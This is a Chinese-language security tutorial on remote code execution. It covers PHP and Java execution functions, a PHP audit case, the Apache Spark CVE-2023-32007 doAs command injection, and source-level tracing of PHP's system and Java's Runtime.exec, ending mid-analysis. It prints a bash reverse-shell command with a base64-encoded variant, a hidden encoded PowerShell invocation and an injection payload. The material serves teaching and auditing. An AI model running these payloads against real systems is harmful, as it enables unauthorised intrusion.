<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/14436?time__1311=mqmx9QD%3D0%3DdDqD5DstoYIpPWqeQu%2Bk20DbD&alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fsearch%3Fkeyword%3Djetty)

> 先知社区，先知安全技术社区

1 前言
----

免责声明：本文中所有漏洞均已修复或已在公网公开，请勿利用文章内的相关技术从事非法测试，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。

本文与第一版没有较强联系，可直接看本文，前置知识需要了解基本的代码审计和渗透测试。文章内容在于全面，深度并不高。

本文可自行转载，但转载需要在**清晰**的地方标明**出处及作者**

如果有相关对本文的修改意见，可在文章评论区交流

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212600-1bd66b28-1219-4ad4-ae7d-858da0647de0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212600-1bd66b28-1219-4ad4-ae7d-858da0647de0.png)

**2 基础概念**
----------

### **2.1 shell 符号使用**

“在计算机安全中，任意代码执行 (RCE) 是攻击者在目标机器或目标进程中运行攻击者选择的任何命令或代码的能力。任意代码执行漏洞是软件或硬件中允许任意代码执行的安全漏洞。设计来利用这种漏洞的程序被称为任意代码执行漏洞。通过网络 (特别是通过 Internet 等广域网) 触发任意代码执行的能力通常被称为远程代码执行(RCE)”

([https://en.wikipedia.org/wiki/Arbitrary_code_execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution))

简单来说就是，你可以通过一些安全漏洞来执行目标计算机的命令，这叫做 RCE。

2.1 SHELL 符号使用

而在执行命令当中，我们会用到很多的 shell 符号，符号的用法如下

cmd1 | cmd2 用于将一个命令的输出作为另一个命令的输入

cmd1 || cmd2 只有当 cmd1 执行失败后，cmd2 才被执行

cmd1 & cmd2 先执行 cmd1，不管是否成功，都会执行 cmd2

cmd1 && cmd2 先执行 cmd1，cmd1 执行成功后才执行 cmd2，否则不执行 cmd2

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212607-42176d76-821b-464e-a84c-9cd776059ac5.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212607-42176d76-821b-464e-a84c-9cd776059ac5.png)

Linux 中支持分号进行拼接执行

cmd1 ; cmd2

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212608-1663a19e-2410-4774-a7f5-5872ef4ea267.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212608-1663a19e-2410-4774-a7f5-5872ef4ea267.png)

php 当中支持反引号进行拼接执行

```
whoami

```

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212757-e2d57300-caab-4346-a85c-0bd482f947d3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212757-e2d57300-caab-4346-a85c-0bd482f947d3.png)

### **2.2 环境配置**

如无特殊说明，本文所使用的环境均为以下配置

Linux

Centos 7

Windows

PHPSTUDY v8.1

PHP 7.3.4

MYSQL8.0.12

安装过程

访问小皮官网 [https://www.xp.cn/](https://www.xp.cn/)

找到 windows 下载地址

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212794-db51103d-4682-4358-a4f3-c7aee5e23d45.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169212794-db51103d-4682-4358-a4f3-c7aee5e23d45.png)

下载完成后打开压缩包，并运行 phpstudy_x64_8.1.1.3.exe

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169214920-a3a7a052-dbd2-409c-b9b0-a294bc3567de.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169214920-a3a7a052-dbd2-409c-b9b0-a294bc3567de.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169215335-fc82efe7-0b7a-4188-a955-e3fc7d286749.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169215335-fc82efe7-0b7a-4188-a955-e3fc7d286749.png)

安装后直接打开 Apache2.4.39 默认 php 版本即为 7.3.4（其他 php 版本可以从官网下载）

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169215479-45192a74-2c88-46c9-a674-f85267d04190.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169215479-45192a74-2c88-46c9-a674-f85267d04190.png)

出现该页面即为成功

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169215320-668a5d88-33ef-40c3-90fd-c2554ae967e4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169215320-668a5d88-33ef-40c3-90fd-c2554ae967e4.png)

**3 常规下 RCE**
-------------

本模块讲解常规情况下可以造成 RCE 的方式，也是基本所有语言的通用造成 RCE 的点

**3.1 基础 RCE**
--------------

### **3.1.1 PHP 基础命令 / 代码执行函数**

该方式最为常见，也是最为经典的方式，开发者因为没有对命令执行函数进行过滤，导致用户可以恶意传参造成的 RCE

PHP 下直接执行系统命令的函数如下

1 exec

用于执行一个外部命令。它只返回命令的最后一行输出。可以通过一个可选的参数来获取命令的所有输出。还可以通过另一个可选的参数来获取命令的返回状态

2 shell_exec

同样用于执行外部命令。会返回命令的完整输出作为一个字符串。不提供命令的返回状态。

3 system

也是用于执行外部命令。它会立即显示输出（适合用于产生大量输出的命令）。返回命令的最后一行输出。可以通过一个可选的参数来获取命令的返回状态。

4 passthru

用于执行外部命令，并直接将原始输出传递给浏览器。常用于执行二进制文件或者需要直接传递数据流的情况（例如，输出图像或音频流）。不返回任何输出，但可以通过一个可选的参数来获取命令的返回状态。

5 反引号

一种简便的语法，用于在 PHP 代码中直接执行外部命令。类似于 shell_exec，会捕获并返回命令的完整输出。

6 popen

用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态。

7 ob_start

ob_start() 是 PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 ob_end_flush() 来发送缓冲区内容至浏览器。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169215389-bcab4c67-24d5-4c0f-bd17-07e33ef868a1.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169215389-bcab4c67-24d5-4c0f-bd17-07e33ef868a1.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169216022-0320c63f-c21a-4175-a3ff-c505bdb9d224.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169216022-0320c63f-c21a-4175-a3ff-c505bdb9d224.png)

执行 php 代码的命令如下

1 eval

用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回。

2 assert

用于测试一个表达式是否为真。如果表达式为假，会抛出一个警告或异常（取决于 PHP 配置）。通常用于调试和测试目的。

这个较为特殊，在 php8 已经被移除了，所以这里用官方的介绍

“assert(mixed $assertion, Throwable|string|null $description = null): bool

assertion 可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。警告在 PHP 8.0.0 之前，如果 assertion 是 string，将解释为 PHP 代码，并通过 eval() 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除。”

3 call_user_func

用于调用一个回调函数，该函数可以是一个函数名或闭包。可以传递多个参数给回调函数。返回回调函数的返回值。适用于动态函数调用。

4 create_function

用于创建匿名（lambda-style）函数。接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用。

同 assert，已在 php7.2 弃用，php8.0 被移除

5 array_map

用于将回调函数应用于数组的每个元素。接受一个回调函数和一个或多个数组。返回一个新数组，数组元素是回调函数应用于原始元素的结果。适用于转换或处理数组元素。

6 call_user_func_array

用于调用回调函数，并将参数作为数组传递。接受两个参数：回调函数和参数数组。返回回调函数的返回值。适用于动态参数数量的函数调用。

7 usort

用于对数组进行自定义排序，接受数组和比较函数作为参数。

比较函数确定元素间的排序顺序，排序后的数组不保留原始键名。

适用于根据用户定义的规则排序数组元素。

8 array_filter

用于过滤数组元素，接受数组和可选的回调函数作为参数。

如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于 false 的元素。

适用于基于条件移除数组中的元素。

9 array_reduce

用于迭代一个数组，并通过回调函数将数组的元素逐一减少到单一值。

接受三个参数：一个数组、一个回调函数和一个可选的初始值。

回调函数接受两个参数：一个是携带结果的累加器，另一个是当前数组元素。返回通过累加器得到的最终值。

10 preg_replace

用于执行正则表达式的搜索和替换。

接受三个参数：模式（正则表达式）、替换值和目标字符串。

可以是单个字符串或数组。返回修改后的字符串或数组。适用于基于模式匹配修改文本内容。(/e 的代码执行版本在 5.6 版本后被移除)

11 $ 符号

在 PHP 中，${} 语法本质上是用于复杂的变量解析，通常在字符串内用来解析变量或表达式。然而，在一些特殊情况下，如果配合 eval 或其他动态执行代码的功能，${} 可以被用来间接执行代码。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169216931-a5896245-c0f7-4106-9912-2c281ea82b59.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169216931-a5896245-c0f7-4106-9912-2c281ea82b59.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169216919-b1f22b9e-cc06-4b68-862d-b43f1483509f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169216919-b1f22b9e-cc06-4b68-862d-b43f1483509f.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169217145-3a8b445a-86a0-41d7-b57e-0bf6032f9aa4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169217145-3a8b445a-86a0-41d7-b57e-0bf6032f9aa4.png)

### **3.1.2 PHP 基础 RCE 案例**

之前跟有位师傅聊天，他给我了一个 rce

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169217129-503167fb-0ed7-465e-b134-c8cab9c4424a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169217129-503167fb-0ed7-465e-b134-c8cab9c4424a.png)

找他要了份源码进行审计

到手的那一刻有点懵，如下

1 exec 中写死了，不可控

2 cmd 写死了，并且没有找到传参的地方

3 popen 执行的 cmd，在本文件中是写死的两个不可控的

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169217170-7cb0b014-fdd2-4a85-923c-f437ffb5da52.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169217170-7cb0b014-fdd2-4a85-923c-f437ffb5da52.png)

那么是如何 rce 的？

我注意到了 popen 执行的 cmd，虽然是写死的，但是在 11 和 12 行中的 if else 语句中，只有 else if，并没有 else，那么 type 假设不是 1 或 2 配合着全局变量即可造成 rce

那么全局在哪呢？第二行 include 了一个 json 文件如下

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218258-e6bbb2a3-6e1f-4f4d-b4da-cf763e24697b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218258-e6bbb2a3-6e1f-4f4d-b4da-cf763e24697b.png)

我们把这 3,4 行拎出来单独 debug

如下

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218452-9482c8da-6634-4263-aafc-eaf8882b8106.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218452-9482c8da-6634-4263-aafc-eaf8882b8106.png)

下面均为 cmd.php 中的代码

开始 debug，打上断点，访问

[http://localhost/index.php?cmd=whoami](http://localhost/index.php?cmd=whoami)

我们可以看到 global 中的 get 参数是我们的命令，也就是 cmd

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218480-60179c04-15a6-49ef-b5ec-a27a2bc10ad4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218480-60179c04-15a6-49ef-b5ec-a27a2bc10ad4.png)

因为 $type 没有赋值，所以可以看到这里的 cmd 并没有被强行改变，依旧是 whoami

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218727-3b4b8668-0317-48e2-a591-77048b5a2a4f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218727-3b4b8668-0317-48e2-a591-77048b5a2a4f.png)

进入到 popen 语句

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218962-9cdcdf7d-1e93-4255-a8c9-b9410b4b4e2c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169218962-9cdcdf7d-1e93-4255-a8c9-b9410b4b4e2c.png)

最后在 while 语句中输出

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220179-ed5dd046-0ba4-46a8-90aa-68a7d3ff3d8f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220179-ed5dd046-0ba4-46a8-90aa-68a7d3ff3d8f.png)

成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220300-b852ffe2-f280-42b6-929a-e8db39b1ed3a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220300-b852ffe2-f280-42b6-929a-e8db39b1ed3a.png)

### **3.1.3 JAVA 基础命令 / 代码执行函数**

JAVA 下直接执行系统命令的函数如下

1 Runtime.getRuntime().exec

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220551-671e23e7-6d4a-4b6c-9822-5f670a84824d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220551-671e23e7-6d4a-4b6c-9822-5f670a84824d.png)

但与 php 不同的是，java 会将其中的参数当成一整个字符串来执行，而不会受到 shell 符号的影响，如图。在 3.1.5 中会详细解析

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220798-4f38744a-199d-45f3-bcf6-b2422cd2fc0a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220798-4f38744a-199d-45f3-bcf6-b2422cd2fc0a.png)

并且这里要注意

Runtime.exec 类型的 RCE 如果要反弹 shell 需要特殊处理：

原命令：bash -i >& /dev/tcp/127.0.0.1/12345 0>&1

处理后：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}

对于 powershell 应该是：powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc YwBhAGwAYwAuAGUAeABlAA==

否则无法成功反弹 shell

2 ProcessBuilder

这个函数与 Runtime.getRuntime().exec 区别在于它是传参更加方便，并且它允许更精细的控制进程的创建，包括环境变量的设置、工作目录的改变以及更复杂的输入输出处理。但总体来说其实与 Runtime.getRuntime().exec 的区别不是很大

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220801-d3a15a8a-2fe2-4747-9ade-b34f70c5ae9b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169220801-d3a15a8a-2fe2-4747-9ade-b34f70c5ae9b.png)

Java 代码执行

其实代码执行就相当于字节码的执行，这里简单写个例子

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169221278-620db649-4e11-4f24-b22f-785c65f24337.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169221278-620db649-4e11-4f24-b22f-785c65f24337.png)

然后使用 javac test.java 编译成字节码文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169221332-03abad2b-b121-4956-abf9-011dda170f73.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169221332-03abad2b-b121-4956-abf9-011dda170f73.png)

使用这段代码来 base64 编码一下

import java.io.*;import java.util.Base64;public class compile {public static void main(String[] args) throws IOException { File file = new File("E:// 审计 //untitled//src//test.class"); FileInputStream fis = new FileInputStream(file); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] buf = new byte[1024]; int n; while ((n = fis.read(buf)) != -1) { baos.write(buf, 0, n); } fis.close(); byte[] classBytes = baos.toByteArray(); String base64 = Base64.getEncoder().encodeToString(classBytes); System.out.println(base64); \}\}

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169221649-967de49a-9538-421e-9440-c2f08268348b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169221649-967de49a-9538-421e-9440-c2f08268348b.png)

然后使用这段代码来解码 base64 后，使用我们自定义的类加载器执行我们的字节码，可以看到成功的执行了 calc 弹出计算器

import java.util.Base64;public class Excute {public static void main(String[] args) throws Exception { final String base64ClassString = "base64 后的字节码"; final byte[] classBytes = Base64.getDecoder().decode(base64ClassString); ClassLoader customClassLoader = new ClassLoader() { @Override protected Class<?> findClass(String name) throws ClassNotFoundException { if ("Test".equals(name)) { return defineClass(name, classBytes, 0, classBytes.length); } return super.findClass(name); } }; // 使用自定义的类加载器来加载我们的 Test 类 Class<?> clazz = Class.forName("test", true, customClassLoader); Object instance = clazz.getDeclaredConstructor().newInstance(); \}\}

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222000-a54055b0-641d-4cc4-837c-6a1a48986ce8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222000-a54055b0-641d-4cc4-837c-6a1a48986ce8.png)

也可以用反射去调用更底层的方法

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222032-7ec69f93-f028-4f88-be6d-64d0f964e0e9.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222032-7ec69f93-f028-4f88-be6d-64d0f964e0e9.png)

在低版本 JDK8 里自带 BCEL ClassLoader 直接执行代码: com.sun.org.apache.bcel.internal.util.ClassLoader

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222312-d7ff8272-dbb3-45e4-b5c3-98730cd3659e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222312-d7ff8272-dbb3-45e4-b5c3-98730cd3659e.png)

### **3.1.4 JAVA 基础 RCE 案例**

选用 CVE-2023-32007 作为案例

环境配备

[https://archive.apache.org/dist/spark/spark-3.2.1/spark-3.2.1-bin-hadoop2.7.tgz](https://archive.apache.org/dist/spark/spark-3.2.1/spark-3.2.1-bin-hadoop2.7.tgz)

给 bin 目录加权限

chmod -R +x bin

因为需要开启 ACl

所以启动服务需要./spark-shell --conf spark.acls.enable=true

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222368-0d60ac97-9753-45f9-b5fa-8595f3334bf3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222368-0d60ac97-9753-45f9-b5fa-8595f3334bf3.png)

访问地址

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222787-fb13961a-c8ad-4a4c-93b9-28c331e9ba1b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169222787-fb13961a-c8ad-4a4c-93b9-28c331e9ba1b.png)

发包

/jobs/?doAs=`echo%201%20>%20/home/1.txt`

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169223398-e6287483-6906-4e64-9ed7-685603df8323.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169223398-e6287483-6906-4e64-9ed7-685603df8323.png)

可以看到成功写入文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169223411-1763ffad-39c2-46d6-bf9e-2169b88bf1d0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169223411-1763ffad-39c2-46d6-bf9e-2169b88bf1d0.png)

下载未编译的漏洞源码

[https://archive.apache.org/dist/spark/spark-3.2.1/spark-3.2.1.tgz](https://archive.apache.org/dist/spark/spark-3.2.1/spark-3.2.1.tgz)

审计分析

入口点在 core\src\main\scala\org\apache\spark\ui\HttpSecurityFilter.scala

通过 60 行获取到我们传参 doAs，然后判断是否是管理员权限，将参数 requestUser 放到 checkAdminPermissions 函数中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169223561-f9b7f6f7-385d-4f9b-8f55-17bbbc71e169.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169223561-f9b7f6f7-385d-4f9b-8f55-17bbbc71e169.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169223503-6268a6dc-7d2b-4a56-b698-76f9b51efecb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169223503-6268a6dc-7d2b-4a56-b698-76f9b51efecb.png)

跟进 isUserInACL，判断条件

如果 user 为 null ，

没有开启 acl，

aclUsers 包含了 WILDCARD_ACL，user，

aclGroups 包含了 WILDCARD_ACL

即返回 true，但显而易见所有条件都不满足，所以会进到 else

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169224011-ed051c00-64d7-4cc9-9405-b27b16937f67.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169224011-ed051c00-64d7-4cc9-9405-b27b16937f67.png)

跟进 getCurrentUserGroups，发现我们的 username 值进入了 getGroups，所以继续跟进其中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227057-c0ffdff7-0176-4e6c-9f57-c6a42637f8e4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227057-c0ffdff7-0176-4e6c-9f57-c6a42637f8e4.png)

在 getGroups 中将 username 传进了 getUnixGroups，而在该函数中使用 executeAndGetOutput 执行命令

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227144-ad3be542-ce9c-4ce3-9fa9-17597c88f165.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227144-ad3be542-ce9c-4ce3-9fa9-17597c88f165.png)

追本溯源，继续跟进，发现我们的参数传递到了 executeCommand 中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227259-184a35ea-43f9-46c2-a184-b710da43b7ef.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227259-184a35ea-43f9-46c2-a184-b710da43b7ef.png)

最终在 ProcessBuilder 中执行我们的命令

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227247-64be8588-4267-4657-84d4-93e80d5f4f01.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227247-64be8588-4267-4657-84d4-93e80d5f4f01.png)

### **3.1.5 php 与 java 命令执行的区别**

从这里下载 php 的源码

[https://www.php.net/releases/](https://www.php.net/releases/)

这里下的是 7.3.4

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227288-f72e350f-5244-4cbb-b4bb-9b4baf737058.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227288-f72e350f-5244-4cbb-b4bb-9b4baf737058.png)

PHP 中，定义函数是 PHP_FUNCTION（XXX）

这里选用 system 来进行解析，全局搜索 PHP_FUNCTION（system）

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227854-bd343cb8-410a-4806-b531-8fc645b42fce.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227854-bd343cb8-410a-4806-b531-8fc645b42fce.png)

找到定义 php_exec_ex 的地方，定义了几个局部变量：

cmd 用于存储要执行的命令，

cmd_len 是命令长度

ret_code 用于存储命令的返回状态码

ret_array 用于存储命令的输出（如果有的话）

ret 用于存储 php_exec 函数的返回结果。

224 和 228 行判断了字符串长度是否为 0，是否有 NULL，如果有的话就退出。然后将参数传递给 php_exec 并解析，进入 php_exec

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227926-672b5947-89a1-4d7f-96ed-256004c5e146.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169227926-672b5947-89a1-4d7f-96ed-256004c5e146.png)

前面都是一些定义，重点在 113-116 行，根据平台差异，使用 VCWD_POPEN 执行命令。Windows 平台下以二进制模式打开，其他平台以文本模式打开。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228024-9e9c3fac-7b43-4ebd-9c79-56b6538f5e46.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228024-9e9c3fac-7b43-4ebd-9c79-56b6538f5e46.png)

跟进 VCMD_POPEN

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228187-439fb3da-0d61-4062-9975-43ac098f140f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228187-439fb3da-0d61-4062-9975-43ac098f140f.png)

跟进 virtual_popen，可以发现如果是 windows 就进入 popen_ex。如果是 Unix 等其他系统，就在下面还有定义，先跟进 windows，进入 popen_ex

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228328-ea0384f7-252d-4fd2-ac29-1e19449da0db.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228328-ea0384f7-252d-4fd2-ac29-1e19449da0db.png)

一点点解析，定义完初始值后，判断 type 参数的长度是不是 1 或 2，如果不是的话返回 NULL。这是因为 type 参数通常是 "r"、"w" 或者加上 "b" 表示二进制模式。

遍历 type 字符串，确保每个字符都是'r'、'w'、'b' 或't' 中的一个。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228859-bc895270-31a6-4316-b228-0f494f910b6c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228859-bc895270-31a6-4316-b228-0f494f910b6c.png)

然后开始分配内存，用户的命令字符串，解释器路径的长度 cmd.exe，sizeof("/c"): 计算包括空格、/c 和一个空格的字符串的大小，加上终止的空字符。最后的 + 2 是提供额外的空间来确保有足够的空间存放字符串的终止空字符以及可能的额外字符（如引号）。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228935-473c52e2-1927-4639-80a5-00204c057bd4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169228935-473c52e2-1927-4639-80a5-00204c057bd4.png)

其中 TWG 宏定义如下，使用了 TSRMG_STATIC 宏来访问与 Windows 相关的全局变量。这里的 win32_globals_id 是一个全局变量或资源的标识符

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229097-b3123d62-bec2-41eb-a976-0c8b980f9086.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229097-b3123d62-bec2-41eb-a976-0c8b980f9086.png)

其中 comspec 就是 cmd.exe

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229206-9e796962-8aa7-4700-b46a-c93a237d45f7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229206-9e796962-8aa7-4700-b46a-c93a237d45f7.png)

那么回到 popen_ex 函数中，分配完空间后在 489 行格式化字符串，因为我们知道了 TWG(comspec) 是硬编码成 cmd.exe 的，所以格式是 cmd.exe /c 命令），在 490 行中使用 php_win32_cp_any_to_w 将字符串转成宽字符版本

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229323-67b55eff-fa36-45bc-8820-d68ebb97a3c2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229323-67b55eff-fa36-45bc-8820-d68ebb97a3c2.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229682-3179ee15-796b-4236-837f-5041c8f93b6c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229682-3179ee15-796b-4236-837f-5041c8f93b6c.png)

再往下走，在 563-567 行中，根据 asuser，使用 CreateProcessAsUserW 或 CreateProcessW 创建进程最终执行命令。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229707-160391f4-21ec-4905-ad20-e8ad92a9fccf.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229707-160391f4-21ec-4905-ad20-e8ad92a9fccf.png)

那么好，我们来分析 java 的，在 jdk 中有个 src 压缩包，直接解压即可获得源码

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229721-81a664af-7857-4a66-8034-841b27fbfef6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229721-81a664af-7857-4a66-8034-841b27fbfef6.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229849-e42bad90-37b9-46b1-8f8f-6d343423758c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229849-e42bad90-37b9-46b1-8f8f-6d343423758c.png)

打开 java，我们分析最为常用的 Runtime.getRuntime().exec，在 java/lang.Runtime.java 文件中，找到 exec 函数，其中有三个重载版本，我们依次来说，这里很简单直接进行调用。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229922-77b5727d-cc39-4c52-8da9-47b14a9c31d3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169229922-77b5727d-cc39-4c52-8da9-47b14a9c31d3.png)

在这里判断了是否是空的命令，如果为空直接退出，然后进行分割，分割后组合代码成数组中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230367-a996b4cb-ae99-4026-a187-ed7263bd8f99.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230367-a996b4cb-ae99-4026-a187-ed7263bd8f99.png)

分割代码如下，使用这些符号来进行切割字符串，比如命令 ls -l 就会分割成 ls 和 -l

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230508-fc8003c0-6056-4f98-b81e-896f29b83232.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230508-fc8003c0-6056-4f98-b81e-896f29b83232.png)

继续跟进第三个版本，获取到刚刚的数组，进入 ProcessBuilder 类中的 start 函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230547-683ac481-1879-45ac-9371-f3501d02a837.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230547-683ac481-1879-45ac-9371-f3501d02a837.png)

进入函数内部。前面保证了命令必须是数组，然后遍历 cmdarray 数组，检查命令或参数中是否包含无效的空字符 \ u0000，包含就抛出异常，进入 ProcessImpl.start

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230676-09194c2a-608b-427e-a68e-1eb61a944c32.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169230676-09194c2a-608b-427e-a68e-1eb61a944c32.png)

前面进行了一些初始化，然后在 139 行创造了一个新的 ProcessImpl

